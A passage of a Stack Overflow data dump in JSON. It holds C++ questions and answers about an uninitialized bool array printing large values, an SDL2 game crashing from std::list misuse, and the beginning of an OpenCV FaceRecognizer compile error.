member[5];\n\n    currentAcc = getLogin( numAccounts, member );\n    return 0;\n}\n\nint getLogin( const int lastAcc, Member[] myMember ){\n    int accNum;\n    cout &lt;&lt; \"account number:\" &lt;&lt; endl;\n    cin &gt;&gt; accNum;\n\n    if( accNum &gt; 0 &amp;&amp; accNum &lt;= lastAcc ){\n        myMember[accNum].setLoggedIn( true );\n    }\n    else{\n        accNum = 0;\n    }\n    return accNum;\n}\n</code></pre>\n\n<p>(p.s. What I really want is a pointer to the array, because I don't want a copy of the entire array to be created. However, I believe that using the array name is actually like using a pointer to the first element. So I think I don't need to worry about that.)</p>\n"}, {"tags": ["c++", "cout"], "comments": [{"owner": {"reputation": 49854, "user_id": 16287, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Ogq0T.png?s=128&g=1", "display_name": "Drew Dormann", "link": "https://stackoverflow.com/users/16287/drew-dormann"}, "edited": false, "score": 1, "creation_date": 1429741543, "post_id": 29809949, "comment_id": 47748080, "body": "Are you asking <i>how</i> an uninitialized <code>bool</code> can hold <code>88</code>, or are you asking why <i>inserting</i> the unitialized <code>bool</code> to <code>cout</code> doesn&#39;t normalize the data?"}, {"owner": {"reputation": 125, "user_id": 1430785, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6dae6b6274e21daad7109f88d3d56781?s=128&d=identicon&r=PG", "display_name": "Alan", "link": "https://stackoverflow.com/users/1430785/alan"}, "reply_to_user": {"reputation": 49854, "user_id": 16287, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Ogq0T.png?s=128&g=1", "display_name": "Drew Dormann", "link": "https://stackoverflow.com/users/16287/drew-dormann"}, "edited": false, "score": 0, "creation_date": 1429741753, "post_id": 29809949, "comment_id": 47748171, "body": "I&#39;m asking how. I&#39;ll clarify this."}, {"owner": {"reputation": 49854, "user_id": 16287, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Ogq0T.png?s=128&g=1", "display_name": "Drew Dormann", "link": "https://stackoverflow.com/users/16287/drew-dormann"}, "edited": false, "score": 0, "creation_date": 1429741862, "post_id": 29809949, "comment_id": 47748219, "body": "note that your program also shows that a <code>bool</code> takes up one full byte of storage."}, {"owner": {"reputation": 125, "user_id": 1430785, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6dae6b6274e21daad7109f88d3d56781?s=128&d=identicon&r=PG", "display_name": "Alan", "link": "https://stackoverflow.com/users/1430785/alan"}, "reply_to_user": {"reputation": 49854, "user_id": 16287, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Ogq0T.png?s=128&g=1", "display_name": "Drew Dormann", "link": "https://stackoverflow.com/users/16287/drew-dormann"}, "edited": false, "score": 0, "creation_date": 1429742119, "post_id": 29809949, "comment_id": 47748330, "body": "Yup I just realized that. That explains the confusion. <i>sigh</i>"}], "answers": [{"tags": [], "owner": {"reputation": 86516, "user_id": 701092, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/xYrM0.jpg?s=128&g=1", "display_name": "0x499602D2", "link": "https://stackoverflow.com/users/701092/0x499602d2"}, "is_accepted": false, "score": 6, "last_activity_date": 1429742206, "last_edit_date": 1429742206, "creation_date": 1429741410, "answer_id": 29810020, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array/29810020#29810020", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<p>You have an array of default-initialized <code>bool</code>s. Default-initialization for primitive types entail no initialization, thus they all have indeterminate values.</p>\n\n<p>You can zero-initialize them by providing a pair of parentheses:</p>\n\n<pre><code>bool *a = new bool[10]();\n</code></pre>\n\n<p>Booleans are 1-byte integral types so the reason you're seeing this output is probably because that is the data on the stack at that moment that can be viewed with a single byte. Notice how they are values under 255 (the largest number that can be produced from an unsigned 1-byte integer).</p>\n\n<p>OTOH, printing out an indeterminate value is Undefined Behavior, so there really is no logic to consider in this program.</p>\n"}, {"tags": [], "owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "is_accepted": false, "score": 0, "last_activity_date": 1429741467, "creation_date": 1429741467, "answer_id": 29810031, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array/29810031#29810031", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<p>What you are seeing is uninitialized values, different compilers generate different code. <a href=\"https://ideone.com/LsnZOG\" rel=\"nofollow\">On GCC I see everything as 0</a> on windows i see junk values.</p>\n\n<p>generally char is the smallest byte addressable- even though bool has 1/0 value- memory access wise it will be a char. Thus you will never see junk value greater than 255</p>\n\n<p>Following initialization (memset fixes the things for you)</p>\n\n<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n    bool* a = new bool[10];\n\n    memset(a, 0, 10*sizeof(bool));\n\n    cout &lt;&lt; sizeof(bool) &lt;&lt; endl;\n    cout &lt;&lt; sizeof(a[0]) &lt;&lt; endl;\n\n    for (int i = 0; i &lt; 10; ++i)\n    {\n        bool b = a[i];\n        cout &lt;&lt; b &lt;&lt; \" \";\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "is_accepted": false, "score": 0, "last_activity_date": 1429741783, "last_edit_date": 1495540358, "creation_date": 1429741783, "answer_id": 29810098, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array/29810098#29810098", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<p>Formally speaking, as pointed out in this <a href=\"https://stackoverflow.com/a/4259991/1760583\">answer</a>, reading any uninitialized variable is undefined behaviour, which basically means everything is possible.</p>\n\n<p>More practically, the memory used by those bools is filled with what you called garbage. <a href=\"http://en.cppreference.com/w/cpp/io/basic_ostream/operator_ltlt\" rel=\"nofollow noreferrer\">ostreams operator&lt;&lt;</a> inserts booleans via <a href=\"http://en.cppreference.com/w/cpp/locale/num_put/put\" rel=\"nofollow noreferrer\">std::num_put::put()</a>, which, if boolalpha is not set, converts the value present to an int and outputs the result. </p>\n"}, {"tags": [], "owner": {"reputation": 49854, "user_id": 16287, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/Ogq0T.png?s=128&g=1", "display_name": "Drew Dormann", "link": "https://stackoverflow.com/users/16287/drew-dormann"}, "is_accepted": true, "score": 0, "last_activity_date": 1429742297, "creation_date": 1429742297, "answer_id": 29810193, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array/29810193#29810193", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<p><code>sizeof(bool)</code> on your machine returns <code>1</code>.</p>\n\n<p>That's 1 <em>byte</em>, not 1 <em>bit</em>, so the values you show can certainly be present.</p>\n"}, {"comments": [{"owner": {"reputation": 15871, "user_id": 2123530, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37a7fba006184897e8d74f1795e2835b?s=128&d=identicon&r=PG", "display_name": "\u03b2.\u03b5\u03b7\u03bf\u03b9\u03c4.\u03b2\u03b5", "link": "https://stackoverflow.com/users/2123530/%ce%b2-%ce%b5%ce%b7%ce%bf%ce%b9%cf%84-%ce%b2%ce%b5"}, "edited": false, "score": 0, "creation_date": 1429744151, "post_id": 29810364, "comment_id": 47749056, "body": "Please use comments if you need clarification on a question rather than answers."}], "tags": [], "owner": {"reputation": 44, "user_id": 2105694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/14e6dec0ced0a6e24345a066da274b43?s=128&d=identicon&r=PG", "display_name": "btrbt", "link": "https://stackoverflow.com/users/2105694/btrbt"}, "is_accepted": false, "score": -1, "last_activity_date": 1429743040, "creation_date": 1429743040, "answer_id": 29810364, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array/29810364#29810364", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<p>I do not know why you put a * sign before variable a .\nIs it a pointer to point a top element address of the array?</p>\n"}], "owner": {"reputation": 125, "user_id": 1430785, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6dae6b6274e21daad7109f88d3d56781?s=128&d=identicon&r=PG", "display_name": "Alan", "link": "https://stackoverflow.com/users/1430785/alan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 690, "favorite_count": 0, "accepted_answer_id": 29810193, "answer_count": 5, "score": 1, "last_activity_date": 1429743040, "creation_date": 1429741097, "last_edit_date": 1429741975, "question_id": 29809949, "link": "https://stackoverflow.com/questions/29809949/c11-why-does-cout-print-large-integers-from-a-boolean-array", "title": "C++11 Why does cout print large integers from a boolean array?", "body": "<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n    bool *a = new bool[10];\n\n    cout &lt;&lt; sizeof(bool) &lt;&lt; endl;\n    cout &lt;&lt; sizeof(a[0]) &lt;&lt; endl;\n\n    for (int i = 0; i &lt; 10; i++) {\n        cout &lt;&lt; a[i] &lt;&lt; \" \";\n    }\n\n    delete[] a;\n}\n</code></pre>\n\n<p>The above code outputs:</p>\n\n<pre><code>1\n1\n112 104 151 0 0 0 0 0 88 1 \n</code></pre>\n\n<p>The last line should contain garbage values, but why are they not all 0 or 1? The same thing happens for a stack-allocated array.</p>\n\n<p>Solved: I forgot that sizeof counts bytes, not bits as I thought.</p>\n"}, {"tags": ["c++", "access-violation", "sdl-2", "push-back"], "comments": [{"owner": {"reputation": 154, "user_id": 4656475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7oAWq.jpg?s=128&g=1", "display_name": "Zara Kay", "link": "https://stackoverflow.com/users/4656475/zara-kay"}, "edited": false, "score": 3, "creation_date": 1429740874, "post_id": 29809813, "comment_id": 47747801, "body": "Have you tried using the debugger and stepping through the code to see which line the program breaks at?"}, {"owner": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 0, "creation_date": 1429740910, "post_id": 29809813, "comment_id": 47747818, "body": "Can you show us your SDL initialization code?"}, {"owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "reply_to_user": {"reputation": 154, "user_id": 4656475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7oAWq.jpg?s=128&g=1", "display_name": "Zara Kay", "link": "https://stackoverflow.com/users/4656475/zara-kay"}, "edited": false, "score": 0, "creation_date": 1429742045, "post_id": 29809813, "comment_id": 47748298, "body": "@MigaraLiyanagamage Debugger shows at completely random pieces of code, that worked perfectly before, which leads me to think, that new functions mess up the memory."}, {"owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "reply_to_user": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 0, "creation_date": 1429742062, "post_id": 29809813, "comment_id": 47748303, "body": "@Brett Code added to the post"}, {"owner": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429742388, "post_id": 29809813, "comment_id": 47748444, "body": "do you have subclasses of Obstacle and add them to your obstacles list?"}, {"owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "reply_to_user": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429742514, "post_id": 29809813, "comment_id": 47748495, "body": "@Diversity No, no subclasses"}, {"owner": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429742711, "post_id": 29809813, "comment_id": 47748562, "body": "It seems that you even don&#39;t have any dynamic allocated pointers or objects is that correct? When you say you have added some function and after that it didn&#39;t work can you emphasize the added functions and the state before"}, {"owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "reply_to_user": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429743126, "post_id": 29809813, "comment_id": 47748698, "body": "@Diversity As far as i understand, the only dynamicly allocated thing in my code is Obstacles list. I have added three functions - move, OutCheck, and eraseObstacle. If i comment them, everything works just fine. My guess is that memory is not managed properly when new objects are created or deleted."}, {"owner": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429743437, "post_id": 29809813, "comment_id": 47748804, "body": "a dynamic allocated object is declared using a star &quot;*&quot; e.G. within the header file Obstacle *obstacle. To allocate memory for this object you have to initialize it by calling the new operator. Obstacle *o = new Obstacle() which will call the default constructor of your class Obstacle. So i can&#39;t see any new operators within your given code. That means that a dangling pointer or memory leak is currently not visible for me because all Memory allocations and deallocations are made implicetely."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 3, "creation_date": 1429743581, "post_id": 29809813, "comment_id": 47748858, "body": "That&#39;s a large amount of code, please try to produce a <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a>"}], "answers": [{"comments": [{"owner": {"reputation": 13642, "user_id": 4013258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d423395e1033fa23d80a5561ab170fa?s=128&d=identicon&r=PG&f=1", "display_name": "Surt", "link": "https://stackoverflow.com/users/4013258/surt"}, "reply_to_user": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429744253, "post_id": 29810440, "comment_id": 47749100, "body": "@Diversity, either I need more sleep or this comment was not intended for me."}, {"owner": {"reputation": 1870, "user_id": 2627868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/100000913831419/picture?type=large", "display_name": "Diversity", "link": "https://stackoverflow.com/users/2627868/diversity"}, "edited": false, "score": 0, "creation_date": 1429744433, "post_id": 29810440, "comment_id": 47749163, "body": "@Surf replaced the comment with an answer"}], "tags": [], "owner": {"reputation": 13642, "user_id": 4013258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d423395e1033fa23d80a5561ab170fa?s=128&d=identicon&r=PG&f=1", "display_name": "Surt", "link": "https://stackoverflow.com/users/4013258/surt"}, "is_accepted": false, "score": 0, "last_activity_date": 1429743468, "creation_date": 1429743468, "answer_id": 29810440, "question_id": 29809813, "link": "https://stackoverflow.com/questions/29809813/c-possible-constructor-error-violation-writing-location/29810440#29810440", "title": "C++ possible constructor error violation writing location", "body": "<p>Unless you have an invariant somewhere that guarantees that ObstacleSet never calls anything on an empty Obstacles list there is a potential problem.</p>\n\n<p>This code has undefined behaviour on an empty list</p>\n\n<pre><code>float ObstacleSet::getX(int number)\n{\n    unsigned N = number;\n    std::list&lt;Obstacle&gt;::iterator i = Obstacles.begin();\n    if (Obstacles.size() &gt; N)\n    {\n        std::advance(i, N);\n    }\n    return i-&gt;xPos;\n}\n</code></pre>\n\n<p>Trying to fix it</p>\n\n<pre><code>float ObstacleSet::getX(int number)\n{\n    unsigned N = number;\n    std::list&lt;Obstacle&gt;::iterator i = Obstacles.begin();\n    if (Obstacles.size() &gt; N)\n    {\n        std::advance(i, N);\n    }\n    if (i != Obstacles.end())\n        return i-&gt;xPos;\n    // handle empty\n    return ERRORPOS; // or throw or assert or ...\n}\n</code></pre>\n\n<p>Same with all other functions that access the list.</p>\n"}, {"tags": [], "owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "is_accepted": false, "score": 0, "last_activity_date": 1429743494, "creation_date": 1429743494, "answer_id": 29810449, "question_id": 29809813, "link": "https://stackoverflow.com/questions/29809813/c-possible-constructor-error-violation-writing-location/29810449#29810449", "title": "C++ possible constructor error violation writing location", "body": "<p>Some issues I see in the code:</p>\n\n<ol>\n<li><p>In <code>ObstacleSet::move()</code> you add five obstacles to the list. It looks like the list can grow indefinitely, resulting in memory overflow.</p></li>\n<li><p>You don't check if <code>Obstacles</code> are empty in <code>eraseObstacle()</code>, <code>getX()</code> and perhaps in other functions which you haven't shown.</p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "is_accepted": true, "score": 0, "last_activity_date": 1429815004, "creation_date": 1429815004, "answer_id": 29831952, "question_id": 29809813, "link": "https://stackoverflow.com/questions/29809813/c-possible-constructor-error-violation-writing-location/29831952#29831952", "title": "C++ possible constructor error violation writing location", "body": "<p>So apparently, there error was not in the code i provided. I initialized SDL_mixer wrongly. I loaded audio like this\n<code>if (Mix_OpenAudio(44100, MIX_DEFAULT_FORMAT, 2, 2048) &lt; 0)</code>, but sampling rate of wav file i provided was not MIX_DEFAULT_FORMAT, which is 22050. \nAnyway, thanks to everybody, who tried to help me with my code. It was a pleasant experience to use stackoverflow for the fisrt time.</p>\n"}], "owner": {"reputation": 19, "user_id": 4821362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ead067d6cfe5198d82188f723ff8878f?s=128&d=identicon&r=PG&f=1", "display_name": "gavriktonio", "link": "https://stackoverflow.com/users/4821362/gavriktonio"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 438, "favorite_count": 0, "accepted_answer_id": 29831952, "answer_count": 3, "score": 1, "last_activity_date": 1429815004, "creation_date": 1429740481, "last_edit_date": 1429741973, "question_id": 29809813, "link": "https://stackoverflow.com/questions/29809813/c-possible-constructor-error-violation-writing-location", "title": "C++ possible constructor error violation writing location", "body": "<p>I have added these functions to my code, and my program started crashing randomly showing \nUnhandled exception at 0x6C7B52E7 (SDL2.dll) in SDL_2.exe: 0xC0000005: Access violation writing location 0xFF00000C. Debugger shows at completely random pieces of code, that worked perfectly before, which leads me to think, that these new functions mess up the memory. </p>\n\n<pre><code>void ObstacleSet::move()\n{\nObstacles.push_back(Obstacle(mScreenWidth, mScreenHeight / 6 + 100, 10, 10, Coin, -29, 0));\nObstacles.push_back(Obstacle(mScreenWidth, mScreenHeight / 6 + 120, 10, 10, Coin, -29, 0));\nObstacles.push_back(Obstacle(mScreenWidth, mScreenHeight / 6 + 140, 10, 10, Coin, -29, 0));\nObstacles.push_back(Obstacle(mScreenWidth, mScreenHeight / 6 + 160, 10, 10, Coin, -29, 0));\nObstacles.push_back(Obstacle(mScreenWidth, mScreenHeight / 6 + 180, 10, 10, Coin, -29, 0));\n\nfor (auto &amp;i : Obstacles)\n    {\n        i.move();\n    }\n}\n\nvoid ObstacleSet::outCheck(unsigned int &amp;score)\n{\n    for (unsigned int i = 0; i &lt; getSize();)\n    {\n        if (getVelX(i) &lt; 0 &amp;&amp; (getX(i) + getW(i) &lt;= 0))\n        {\n            eraseObstacle(i);\n            score++;\n        }\n\n        else if (getVelX(i) &gt; 0 &amp;&amp; (getX(i) &gt;= mScreenWidth))\n        {\n            eraseObstacle(i);\n            score++;\n        }\n\n        else if (getVelY(i) &gt; 0 &amp;&amp; (getY(i) + getH(i) &gt;= mScreenHeight))\n        {\n            eraseObstacle(i);\n            score++;\n        }\n\n        else if (getVelY(i) &lt; 0 &amp;&amp; (getY(i) &lt;= 0))\n        {\n            eraseObstacle(i);\n            score++;\n        }\n\n        else\n        {\n            ++i;\n        }\n    }\n}\n</code></pre>\n\n<p>Apparently, i have some memory leak, or a dangling pointer somehow appears, but i just can not see where. Maybe i have a wrong constructor or something.</p>\n\n<p>ObstacleSet is a class, that holds all Obstacles in a list.</p>\n\n<pre><code>#ifndef MOBSTSET_H\n#define MOBSTSET_H\n\n#include &lt;SDL.h&gt;\n#include &lt;cstdlib&gt;\n#include \"my_OBSTACLES.h\"\n#include &lt;list&gt;\n\nclass ObstacleSet\n{\npublic:\n\nObstacleSet(int ScreenWidth, int ScreenHeight);\n\nint mScreenWidth;\nint mScreenHeight;\n\nvoid clear();\n\n//Function, that moves the set depending on current time\nvoid move();\n\n//Render set on screen\nvoid render(SDL_Renderer *Renderer);\n\nunsigned int getSize();\n\nfloat getX(int);\nfloat getY(int);\nint getW(int);\nint getH(int);\nfloat getVelX(int);\nfloat getVelY(int);\nType GetType(int);\n\nvoid eraseObstacle(int);\n\nvoid outCheck(unsigned int &amp;score);\n\nstd::list&lt;Obstacle&gt;::iterator getEnd();\n\nprivate:\n\n//Vector to hold all obstacles\nstd::list &lt;Obstacle&gt; Obstacles;\n\n};\n#endif\n</code></pre>\n\n<p>These appear in my main game loop one after another</p>\n\n<p>Obstacle class header</p>\n\n<pre><code>#ifndef MYOBSTACLE_H\n#define MYOBSTACLE_H\n\n#include &lt;SDL.h&gt;\n#include &lt;cmath&gt;\n#include &lt;vector&gt;\n#include &lt;cstdlib&gt;\n\nenum Type\n{\nWall,\nCoin\n};\n\nclass Obstacle\n{\npublic:\nObstacle();\n\n//Initializer with parameters\nObstacle(float x, float y, int w, int h, Type type, float VelocityX = 0, float VelocityY = 0);\n\nfloat VelocityX = 0;\nfloat VelocityY = 0;\n\nfloat xPos;\nfloat yPos;\n\nint mWidth;\nint mHeight;\n\n//Type of obstacle\nType OBSType;\n\n//Render obstacle on screen\nvoid render(SDL_Renderer *Renderer);\n\n//Move obstacle\nvoid move();\n\nint mRed = 200;\nint mGreen = 200;\nint mBlue = 20;\nbool color_up = false;\n};\n\n#endif\n</code></pre>\n\n<p>These are my constructors for Obstacle</p>\n\n<pre><code>Obstacle::Obstacle() : xPos(10), yPos(10), mWidth(10), mHeight(10), VelocityX(0), VelocityY(0), OBSType(Coin), mRed(200), mGreen(200), mBlue(20), color_up(false)\n{\n    printf(\"Obstacle created!\");\n}\n\nObstacle::Obstacle(float x, float y, int w, int h, Type type, float velocityX, float velocityY) : xPos(x), yPos(y), mWidth(w), mHeight(h), VelocityX(velocityX), VelocityY(velocityY), OBSType(type), mRed(200), mGreen(200), mBlue(20), color_up(false)\n{\n\n}\n</code></pre>\n\n<p>Here are some functions of ObstacleSet</p>\n\n<pre><code>void ObstacleSet::eraseObstacle(int number)\n{\n    unsigned N = number;\n    std::list&lt;Obstacle&gt;::iterator i = Obstacles.begin();\n    if (Obstacles.size() &gt; N)\n    {\n        std::advance(i, N);\n    }\n        Obstacles.erase(i);\n}\n\nunsigned int ObstacleSet::getSize()\n{\n    return Obstacles.size();\n}\n\nfloat ObstacleSet::getX(int number)\n{\n    unsigned N = number;\n    std::list&lt;Obstacle&gt;::iterator i = Obstacles.begin();\n    if (Obstacles.size() &gt; N)\n    {\n        std::advance(i, N);\n    }\n    return i-&gt;xPos;\n}\n\nstd::list&lt;Obstacle&gt;::iterator ObstacleSet::getEnd()\n{\n    return Obstacles.end();\n}\n</code></pre>\n\n<p>SDL Initialization code</p>\n\n<pre><code>bool init()\n{\n    //Initialization flag\n    bool success = true;\n\n    //Initialize SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_JOYSTICK | SDL_INIT_AUDIO) &lt; 0)\n    {\n        printf(\"SDL could not initialize! SDL Error: %s\\n\", SDL_GetError());\n        success = false;\n    }\n    else\n        //Set texture filtering to linear\n        if (!SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, \"1\"))\n        {\n            printf(\"Warning: Linear texture filtering not enabled!\");\n        }\n\n    //Initialize SDL_mixer\n    if (Mix_OpenAudio(44100, MIX_DEFAULT_FORMAT, 2, 2048) &lt; 0)\n    {\n        printf(\"SDL_mixer could not initialize! SDL_mixer Error: %s\\n\", Mix_GetError());\n        success = false;\n    }\n\n    //Check for joysticks\n    if (SDL_NumJoysticks() &lt; 1)\n    {\n        printf(\"Warning: No joysticks connected!\\n\");\n    }\n    else\n    {\n        //Load joystick\n        gGameController = SDL_JoystickOpen(0);\n        if (gGameController == NULL)\n        {\n            printf(\"Warning: Unable to open game controller! SDL Error: %s\\n\", SDL_GetError());\n        }\n    }\n\n    //Create window\n    gWindow = SDL_CreateWindow(\"Jello demo\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n    if (gWindow == NULL)\n    {\n        printf(\"Window could not be created! SDL Error: %s\\n\", SDL_GetError());\n        success = false;\n    }\n    else\n    {\n        //Create vsynced renderer for window\n        gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n        if (gRenderer == NULL)\n        {\n            printf(\"Renderer could not be created! SDL Error: %s\\n\", SDL_GetError());\n            success = false;\n        }\n        else\n            //Initialize renderer color\n            SDL_SetRenderDrawColor(gRenderer, 0xFF, 0xFF, 0xFF, 0xFF);\n\n        //Initialize PNG loading\n        int imgFlags = IMG_INIT_PNG;\n        if (!(IMG_Init(imgFlags) &amp; imgFlags))\n        {\n            printf(\"SDL_image could not initialize! SDL_image Error: %s\\n\", IMG_GetError());\n            success = false;\n        }\n\n        //Initialize SDL_ttf\n        if (TTF_Init() == -1)\n        {\n            printf(\"SSDL_ttf could not initialize! SDL_ttf Error: %s\\n\", TTF_GetError());\n            success = false;\n        }\n    }\n    return success;\n}\n</code></pre>\n\n<p>Maybe I have got a memory leak or a dangling pointer, but I can't find where the mistake is. I will be VERY glad if anyone could find where i am wrong. Write me if you need any additional code pieces</p>\n"}, {"tags": ["c++", "opencv", "compiler-errors", "opencv3.0"], "answers": [{"comments": [{"owner": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "edited": false, "score": 0, "creation_date": 1442557616, "post_id": 32642027, "comment_id": 53138120, "body": "careful, above answer is <b>only</b> valid for the now <b>obsolete rc3.0</b> version, api has changed <a href=\"http://docs.opencv.org/ref/master/dc/dd7/classcv_1_1face_1_1BasicFaceRecognizer.html#ab34eeaa66965821c0593e03ffe1d3a74\" rel=\"nofollow noreferrer\">again</a>  (the docs cited above are outdated, too) . please also take a look at the updated <a href=\"http://docs.opencv.org/ref/master/da/d60/tutorial_face_main.html\" rel=\"nofollow noreferrer\">tutorials</a>"}], "tags": [], "owner": {"reputation": 2346, "user_id": 5179465, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d11933d9ee569ac40d0111430579f556?s=128&d=identicon&r=PG&f=1", "display_name": "ilke444", "link": "https://stackoverflow.com/users/5179465/ilke444"}, "is_accepted": true, "score": 0, "last_activity_date": 1442536035, "creation_date": 1442536035, "answer_id": 32642027, "question_id": 29809812, "link": "https://stackoverflow.com/questions/29809812/error-no-member-named-getmat-in-cvfacefacerecognizer/32642027#32642027", "title": "error: no member named &#39;getMat&#39; in &#39;cv::face::FaceRecognizer&#39;", "body": "<p>According to <a href=\"http://docs.opencv.org/3.0-last-rst/modules/face/doc/facerec_tutorial.html\" 